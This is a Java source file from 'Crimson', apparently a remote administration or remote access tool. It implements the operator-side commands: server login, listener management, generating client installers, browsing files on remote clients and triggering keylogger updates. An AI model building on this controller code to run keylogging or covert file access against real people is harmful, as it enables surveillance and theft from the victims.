/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.net;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.proto.FileManager.MI_CloseFileHandle;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_AdvancedFileInfo;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileHandle;
import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
import com.subterranean_security.crimson.core.proto.FileManager.RS_AdvancedFileInfo;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.GenReport;
import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
import com.subterranean_security.crimson.core.proto.Listener.RQ_AddListener;
import com.subterranean_security.crimson.core.proto.Listener.RQ_RemoveListener;
import com.subterranean_security.crimson.core.proto.Login.RQ_Login;
import com.subterranean_security.crimson.core.proto.Login.RQ_LoginChallenge;
import com.subterranean_security.crimson.core.proto.Login.RS_LoginChallenge;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.State.RQ_ChangeClientState;
import com.subterranean_security.crimson.core.proto.State.RQ_ChangeServerState;
import com.subterranean_security.crimson.core.proto.State.StateType;
import com.subterranean_security.crimson.core.proto.Users.RQ_AddUser;
import com.subterranean_security.crimson.core.proto.Users.RQ_EditUser;
import com.subterranean_security.crimson.core.proto.Users.ViewerPermissions;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.Crypto;
import com.subterranean_security.crimson.core.util.IDGen;
import com.subterranean_security.crimson.viewer.ViewerStore;
import com.subterranean_security.crimson.viewer.ui.screen.files.FileTable;
import com.subterranean_security.crimson.viewer.ui.screen.generator.Report;
import com.subterranean_security.crimson.viewer.ui.screen.main.MainFrame;

public enum ViewerCommands {
	;
	private static final Logger log = LoggerFactory.getLogger(ViewerCommands.class);

	public static boolean login(String user, char[] pass) {
		int id = IDGen.get();

		ViewerRouter.route(Message.newBuilder().setId(id).setRqLogin(RQ_Login.newBuilder().setUsername(user)).build());

		try {
			Message lcrq = ViewerRouter.getReponse(0, id, 5);
			if (lcrq == null) {
				log.error("No reponse");
				return false;
			} else if (lcrq.hasRqLoginChallenge()) {
				RQ_LoginChallenge challenge = lcrq.getRqLoginChallenge();
				String result = challenge.getCloud() ? Crypto.hashOCPass(new String(pass), challenge.getSalt())
						: Crypto.hashPass(pass, challenge.getSalt());
				ViewerRouter.route(Message.newBuilder().setId(id)
						.setRsLoginChallenge(RS_LoginChallenge.newBuilder().setResult(result)).build());
			} else if (lcrq.hasRsLogin()) {
				log.debug("Received login response: Invalid user");
				return false;
			} else {
				log.debug("Expected login challenge");
				return false;
			}
		} catch (InterruptedException e) {
			log.debug("Login interrupted");
			return false;
		}

		try {
			Message lrs = ViewerRouter.getReponse(0, id, 5);
			if (lrs.hasRsLogin()) {
				if (lrs.getRsLogin().getResponse()) {
					ViewerStore.Profiles.server.amalgamate(lrs.getRsLogin().getSpd());
					ViewerStore.Profiles.vp.amalgamate(lrs.getRsLogin().getVpd());
					return true;
				}

			} else {
				log.debug("Expected login response");
				return false;
			}
		} catch (InterruptedException e) {
			log.debug("Login interrupted");
		}
		return false;
	}

	public static boolean changeServerState(StringBuffer error, StateType st) {
		log.debug("Changing server state: {}", st.toString());
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqChangeServerState(RQ_ChangeServerState.newBuilder().setNewState(st)), 3);
			if (m == null) {
				error.append("No response");
			} else if (!m.getRsChangeServerState().getResult()) {
				if (m.getRsChangeServerState().hasComment()) {
					error.append(m.getRsChangeServerState().getComment());
				}
			} else {
				return true;
			}
		} catch (InterruptedException e) {
			error.append("Interrupted");
		}
		log.debug("error: {}", error.toString());
		return false;
	}

	public static boolean changeClientState(StringBuffer error, int cid, StateType st) {
		log.debug("Changing client state: {}", st.toString());
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid)
					.setRqChangeClientState(RQ_ChangeClientState.newBuilder().setNewState(st)), 3);
			if (m == null) {
				error.append("No response");
			} else if (!m.getRsChangeServerState().getResult()) {
				if (m.getRsChangeServerState().hasComment()) {
					error.append(m.getRsChangeServerState().getComment());
				}
			} else {
				return true;
			}
		} catch (InterruptedException e) {
			error.append("Interrupted");
		}
		log.debug("error: {}", error.toString());
		return false;
	}

	public static boolean addListener(StringBuffer error, ListenerConfig lf) {
		try {
			Message m = ViewerRouter
					.routeAndWait(Message.newBuilder().setRqAddListener(RQ_AddListener.newBuilder().setConfig(lf)), 3);
			if (m == null) {
				error.append("No response");
			} else if (!m.getRsAddListener().getResult()) {
				if (m.getRsAddListener().hasComment()) {
					error.append(m.getRsAddListener().getComment());
				}
				return false;
			}
		} catch (InterruptedException e) {
			error.append("Interrupted");
			return false;
		}

		return true;
	}

	public static boolean removeListener(StringBuffer error, int id) {
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setRqRemoveListener(RQ_RemoveListener.newBuilder().setId(id)), 3);
			if (m == null) {
				error.append("No response");
			} else if (!m.getRsRemoveListener().getResult()) {
				if (m.getRsRemoveListener().hasComment()) {
					error.append(m.getRsRemoveListener().getComment());
				}
				return false;
			}
		} catch (InterruptedException e) {
			error.append("Interrupted");
			return false;
		}

		return true;
	}

	public static boolean addUser(StringBuffer error, String user, char[] pass, ViewerPermissions vp) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRqAddUser(
					RQ_AddUser.newBuilder().setUser(user).setPassword(new String(pass)).setPermissions(vp)), 2);
			if (m == null) {
				error.append("No response");
			} else if (!m.getRsAddUser().getResult()) {
				if (m.getRsAddUser().hasComment()) {
					error.append(m.getRsAddUser().getComment());
				}
				return false;
			}
		} catch (InterruptedException e) {
			error.append("Interrupted");
			return false;
		}

		return true;
	}

	public static boolean editUser(StringBuffer error, String user, char[] pass, ViewerPermissions vp) {

		RQ_AddUser.Builder rqau = RQ_AddUser.newBuilder().setUser(user).setPermissions(vp);
		if (pass != null) {
			rqau.setPassword(new String(pass));
		}

		try {
			Message m = ViewerRouter
					.routeAndWait(Message.newBuilder().setRqEditUser(RQ_EditUser.newBuilder().setUser(rqau)), 2);
			if (m == null) {
				error.append("No response");
			} else if (!m.getRsEditUser().getResult()) {
				if (m.getRsEditUser().hasComment()) {
					error.append(m.getRsEditUser().getComment());
				}
				return false;
			}
		} catch (InterruptedException e) {
			error.append("Interrupted");
			return false;
		}

		return true;
	}

	public static void generate(ClientConfig config, String output, Date creation) {
		int id = IDGen.get();
		RQ_Generate.Builder rq = RQ_Generate.newBuilder().setInternalConfig(config);

		ViewerRouter.route(Message.newBuilder().setId(id).setRqGenerate(rq).build());

		try {
			Message rs = ViewerRouter.getReponse(0, id, 20);
			if (rs != null) {
				// success
				final GenReport gr = rs.getRsGenerate().getReport();
				Runnable r = new Runnable() {
					public void run() {
						Report rep = new Report(gr);
						rep.setVisible(true);

					}
				};

				if (gr.getResult()) {
					MainFrame.main.np.addNote("info", "Generation complete!", "Click for report", r);
					CUtil.Files.writeFile(rs.getRsGenerate().getInstaller().toByteArray(), new File(output));
				} else {
					MainFrame.main.np.addNote("error", "Generation failed!", "Click for report", r);
					log.error("Could not generate an installer");
				}

			} else {
				MainFrame.main.np.addNote("error", "Generation Timed Out!");
				log.error("Could not generate an installer. Check the network.");
			}
		} catch (InterruptedException e) {
			log.debug("Generation interrupted");
		} catch (IOException e) {
			log.error("Failed to write the installer");
			e.printStackTrace();
		}

	}

	public static int getFileHandle(int cid) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
					.setSid(Common.cvid).setRqFileHandle(RQ_FileHandle.newBuilder()), 2);
			if (m != null) {
				return m.getRsFileHandle().getFmid();
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return 0;
	}

	public static void closeFileHandle(int cid, int fmid) {

		ViewerRouter.route(
				Message.newBuilder().setRid(cid).setMiCloseFileHandle(MI_CloseFileHandle.newBuilder().setFmid(fmid)));

	}

	public static void fm_down(FileTable ft, int cid, int fmid, String name, boolean mtime, boolean size) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
					.setSid(Common.cvid).setRqFileListing(RQ_FileListing.newBuilder().setDown(name).setFmid(fmid)), 2);
			ft.pane.pwd.setPwd(m.getRsFileListing().getPath());
			ft.setFiles(m.getRsFileListing().getListingList());
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void fm_up(FileTable ft, int cid, int fmid, boolean mtime, boolean size) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
					.setSid(Common.cvid).setRqFileListing(RQ_FileListing.newBuilder().setUp(true).setFmid(fmid)), 2);
			ft.pane.pwd.setPwd(m.getRsFileListing().getPath());
			ft.setFiles(m.getRsFileListing().getListingList());
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void fm_list(FileTable ft, int cid, int fmid, boolean mtime, boolean size) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
					.setSid(Common.cvid).setRqFileListing(RQ_FileListing.newBuilder().setFmid(fmid)), 2);
			ft.pane.pwd.setPwd(m.getRsFileListing().getPath());
			ft.setFiles(m.getRsFileListing().getListingList());
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static RS_AdvancedFileInfo fm_file_info(int cid, String path) {
		try {
			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
					.setSid(Common.cvid).setRqAdvancedFileInfo(RQ_AdvancedFileInfo.newBuilder().setFile(path)), 2);
			return m.getRsAdvancedFileInfo();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static void trigger_key_update(int cid, Date target) {
		log.debug("Triggering keylog update");
		try {
			Message m = ViewerRouter.routeAndWait(
					Message.newBuilder().setId(IDGen.get()).setRqKeyUpdate(
							RQ_KeyUpdate.newBuilder().setCid(cid).setStartDate(target == null ? 0 : target.getTime())),
					30);
			if (m != null) {
				log.debug("Update result: " + m.getRsKeyUpdate().getResult());
			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
